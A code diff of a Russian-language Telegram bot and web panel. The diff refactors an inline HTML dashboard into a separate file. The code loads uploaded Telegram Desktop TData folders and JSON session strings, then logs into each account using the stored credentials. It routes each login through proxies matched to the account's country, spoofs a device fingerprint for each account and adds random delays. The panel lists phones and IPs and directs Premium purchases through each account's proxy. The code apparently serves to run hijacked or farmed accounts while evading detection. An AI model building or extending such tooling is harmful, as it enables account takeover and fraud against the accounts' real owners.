@@ -85,7 +85,7 @@ def get_ip_country(ip):
     except: pass
     return "UNKNOWN"
 
-# --- API И ВСТРОЕННАЯ ПАНЕЛЬ ---
+# --- API ---
 @web.middleware
 async def cors_middleware(request, handler):
     if request.method == 'OPTIONS':
@@ -104,105 +104,12 @@ async def handle_get_premium_link(request):
     if not acc: return web.json_response({"status": "error", "message": "Не найден"}, status=404)
     return web.json_response({"status": "ok", "premium_url": "https://t.me/PremiumBot", "proxy": acc.get("proxy", "Нет"), "country": acc.get("proxy_country", "UNKNOWN")})
 
+# --- ОТДАЧА HTML ФАЙЛА ---
 async def handle_index(request):
-    html_content = """
-    <!DOCTYPE html>
-    <html lang="ru">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>Premium Manager</title>
-        <script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <style>
-            :root { --bg: var(--tg-theme-bg-color, #121212); --card: var(--tg-theme-secondary-bg-color, #1e1e1e); --text: var(--tg-theme-text-color, #fff); --hint: var(--tg-theme-hint-color, #888); --success: #2ecc71; --danger: #e74c3c; }
-            body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 16px; }
-            .card { background: var(--card); border-radius: 16px; padding: 16px; margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.05); }
-            .header { font-size: 20px; font-weight: 700; margin-bottom: 16px; text-align: center; }
-            .btn { width: 100%; padding: 14px; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; }
-            .btn-buy { background: var(--success); color: #fff; padding: 8px; font-size: 14px; margin-top: 10px; width: auto; display: inline-block; }
-            .account-row { display: flex; flex-direction: column; gap: 8px; border-bottom: 1px solid rgba(255,255,255,0.1); padding: 12px 0; }
-            .account-row:last-child { border-bottom: none; }
-            .acc-top { display: flex; justify-content: space-between; align-items: center; }
-            .acc-name { font-weight: 700; font-size: 16px; }
-            .acc-phone { font-size: 14px; color: var(--hint); }
-            .acc-details { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 13px; margin-top: 4px; }
-            .detail-item { background: rgba(255,255,255,0.03); padding: 6px; border-radius: 6px; }
-            .detail-label { color: var(--hint); font-size: 11px; display: block; }
-            .status-badge { padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 700; }
-            .prem-yes { background: rgba(46, 204, 113, 0.2); color: var(--success); }
-            .prem-no { background: rgba(231, 76, 60, 0.2); color: var(--danger); }
-            .total-counter { font-size: 14px; color: var(--hint); text-align: center; margin-bottom: 12px; }
-        </style>
-    </head>
-    <body>
-        <div class="header">💎 Premium Manager</div>
-        <div class="total-counter" id="total-counter">Загрузка данных...</div>
-        <div id="accounts-list"></div>
-        <script>
-            const tg = window.Telegram.WebApp; tg.expand();
-            const API_URL = window.location.origin; 
-
-            async function fetchAccounts() {
-                try {
-                    const res = await fetch(`${API_URL}/api/accounts`);
-                    if (!res.ok) throw new Error("Сервер не отвечает");
-                    const accounts = await res.json();
-                    const listEl = document.getElementById('accounts-list');
-                    const counterEl = document.getElementById('total-counter');
-                    if (accounts.length === 0) {
-                        counterEl.innerText = "Нет загруженных аккаунтов";
-                        listEl.innerHTML = "<div style='text-align:center; color:var(--hint);'>Зайди в бота и загрузи ZIP с аккаунтами.</div>";
-                        return;
-                    }
-                    counterEl.innerText = `Всего аккаунтов: ${accounts.length}`;
-                    listEl.innerHTML = accounts.map(acc => {
-                        const premClass = acc.premium ? 'prem-yes' : 'prem-no';
-                        const premText = acc.premium ? `Premium до ${acc.premium_expires}` : 'Без Premium';
-                        return `
-                        <div class="card account-row">
-                            <div class="acc-top">
-                                <div>
-                                    <div class="acc-name">${acc.username} ${acc.first_name}</div>
-                                    <div class="acc-phone">${acc.phone}</div>
-                                </div>
-                                <div class="status-badge ${premClass}">${premText}</div>
-                            </div>
-                            <div class="acc-details">
-                                <div class="detail-item"><span class="detail-label">Страна (IP)</span> ${acc.proxy_country} (${acc.ip})</div>
-                                <div class="detail-item"><span class="detail-label">Устройство</span> ${acc.device}</div>
-                                <div class="detail-item" style="grid-column: span 2;"><span class="detail-label">Прокси</span> ${acc.proxy}</div>
-                            </div>
-                            <button class="btn btn-buy" onclick="buyPremium('${acc.id}')">💎 Купить Premium (1 мес)</button>
-                        </div>
-                        `;
-                    }).join("");
-                } catch (e) { 
-                    document.getElementById('total-counter').innerText = "Ошибка загрузки";
-                    document.getElementById('accounts-list').innerHTML = `<div style='text-align:center; color:var(--danger);'>${e.message}</div>`;
-                }
-            }
-
-            async function buyPremium(accountId) {
-                try {
-                    const res = await fetch(`${API_URL}/api/get_premium_link?account_id=${accountId}`);
-                    const data = await res.json();
-                    if (data.status === 'ok') {
-                        tg.showPopup({
-                            title: 'Оплата Premium (1 месяц)',
-                            message: `Открой @PremiumBot строго через этот прокси:\\n${data.proxy}\\n\\nВ боте выбери "1 месяц" и оплати картой.`,
-                            buttons: [{id: 'open', type: 'default', text: 'Открыть @PremiumBot'}]
-                        }, function(btnId) {
-                            if (btnId === 'open') { tg.openLink(data.premium_url); }
-                        });
-                    } else { tg.showAlert("Ошибка: " + data.message); }
-                } catch (e) { tg.showAlert("Ошибка: " + e.message); }
-            }
-            document.addEventListener('DOMContentLoaded', () => { fetchAccounts(); });
-        </script>
-    </body>
-    </html>
-    """
-    return web.Response(text=html_content, content_type='text/html')
+    html_path = Path(__file__).parent / "index.html"
+    if html_path.exists():
+        return web.FileResponse(html_path)
+    return web.Response(text="Ошибка: index.html не найден", status=404)
 
 # --- ЛОГИКА БОТА ---
 @dp.message(Command("start"))
@@ -259,21 +166,13 @@ async def process_proxies(message: Message, state: FSMContext):
     accounts = []
     processed_ids = set()
 
-    # 1. Сначала пробуем найти стандартные папки TData (с key_d)
+    # 1. Обработка TData (key_d / key_datas)
     for root, dirs, files in os.walk(TDATA_DIR):
         if "key_d" in files or "key_datas" in files:
             folder_name = os.path.basename(root)
             if folder_name in processed_ids: continue
-            
             device = get_sticky_device(folder_name)
-            acc_info = {
-                "id": folder_name, "username": "Ошибка", "first_name": "", "phone": "N/A", 
-                "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", 
-                "time": datetime.now().strftime("%H:%M"), "premium": False, 
-                "premium_expires": "Нет", "valid": False, 
-                "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
-            }
-            
+            acc_info = {"id": folder_name, "username": "Ошибка", "first_name": "", "phone": "N/A", "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", "time": datetime.now().strftime("%H:%M"), "premium": False, "premium_expires": "Нет", "valid": False, "device": f"{device['model']} ({device['system']})", "proxy": "Нет"}
             await asyncio.sleep(random.uniform(1.0, 3.0))
             try:
                 acc = read_tdata(root)
@@ -281,20 +180,13 @@ async def process_proxies(message: Message, state: FSMContext):
                 temp_proxy = random.choice(proxy_list)
                 client = TelegramClient(StringSession(session_string), acc.api_id, acc.api_hash, device_model=device['model'], system_version=device['system'], app_version=device['app'], proxy=temp_proxy['tuple'])
                 await client.connect()
-                
                 if await client.is_user_authorized():
                     me = await client.get_me()
-                    acc_info.update({
-                        "username": me.username or me.first_name or "Без юзернейма",
-                        "first_name": me.first_name or "",
-                        "phone": f"+{me.phone}" if me.phone else "Скрыт",
-                        "valid": True
-                    })
+                    acc_info.update({"username": me.username or me.first_name or "Без юзернейма", "first_name": me.first_name or "", "phone": f"+{me.phone}" if me.phone else "Скрыт", "valid": True})
                     full_user = await client(GetFullUserRequest(me.id))
                     if full_user.full_user.premium_expires:
                         acc_info["premium"] = True
                         acc_info["premium_expires"] = datetime.fromtimestamp(full_user.full_user.premium_expires).strftime("%d.%m.%Y")
-                    
                     if me.phone: acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
                     matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
                     chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
@@ -303,12 +195,11 @@ async def process_proxies(message: Message, state: FSMContext):
             except Exception as e:
                 print(f"ОШИБКА TData {folder_name}: {e}")
                 acc_info["username"] = f"Ошибка: {str(e)[:30]}"
-            
             accounts.append(acc_info)
             processed_ids.add(folder_name)
             save_json(ACCOUNTS_FILE, accounts)
 
-    # 2. Если TData не найдены, ищем JSON-файлы с сессиями
+    # 2. Обработка JSON-сессий (если нет TData)
     if not accounts:
         for root, dirs, files in os.walk(TDATA_DIR):
             for file in files:
@@ -316,7 +207,6 @@ async def process_proxies(message: Message, state: FSMContext):
                     json_path = os.path.join(root, file)
                     acc_id = file.replace(".json", "")
                     if acc_id in processed_ids: continue
-                    
                     try:
                         with open(json_path, "r", encoding="utf-8") as f: data = json.load(f)
                         session_str = data.get("session_string") or data.get("session")
@@ -324,35 +214,20 @@ async def process_proxies(message: Message, state: FSMContext):
                         api_hash = data.get("api_hash")
                         if not session_str or not api_id or not api_hash: continue
                     except: continue
-                        
                     device = get_sticky_device(acc_id)
-                    acc_info = {
-                        "id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", 
-                        "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", 
-                        "time": datetime.now().strftime("%H:%M"), "premium": False, 
-                        "premium_expires": "Нет", "valid": False, 
-                        "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
-                    }
-                    
+                    acc_info = {"id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", "time": datetime.now().strftime("%H:%M"), "premium": False, "premium_expires": "Нет", "valid": False, "device": f"{device['model']} ({device['system']})", "proxy": "Нет"}
                     await asyncio.sleep(random.uniform(1.0, 3.0))
                     try:
                         temp_proxy = random.choice(proxy_list)
                         client = TelegramClient(StringSession(session_str), api_id, api_hash, device_model=device['model'], system_version=device['system'], app_version=device['app'], proxy=temp_proxy['tuple'])
                         await client.connect()
-                        
                         if await client.is_user_authorized():
                             me = await client.get_me()
-                            acc_info.update({
-                                "username": me.username or me.first_name or "Без юзернейма",
-                                "first_name": me.first_name or "",
-                                "phone": f"+{me.phone}" if me.phone else "Скрыт",
-                                "valid": True
-                            })
+                            acc_info.update({"username": me.username or me.first_name or "Без юзернейма", "first_name": me.first_name or "", "phone": f"+{me.phone}" if me.phone else "Скрыт", "valid": True})
                             full_user = await client(GetFullUserRequest(me.id))
                             if full_user.full_user.premium_expires:
                                 acc_info["premium"] = True
                                 acc_info["premium_expires"] = datetime.fromtimestamp(full_user.full_user.premium_expires).strftime("%d.%m.%Y")
-                            
                             if me.phone: acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
                             matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
                             chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
@@ -361,7 +236,6 @@ async def process_proxies(message: Message, state: FSMContext):
                     except Exception as e:
                         print(f"ОШИБКА JSON {acc_id}: {e}")
                         acc_info["username"] = f"Ошибка: {str(e)[:30]}"
-                    
                     accounts.append(acc_info)
                     processed_ids.add(acc_id)
                     save_json(ACCOUNTS_FILE, accounts)
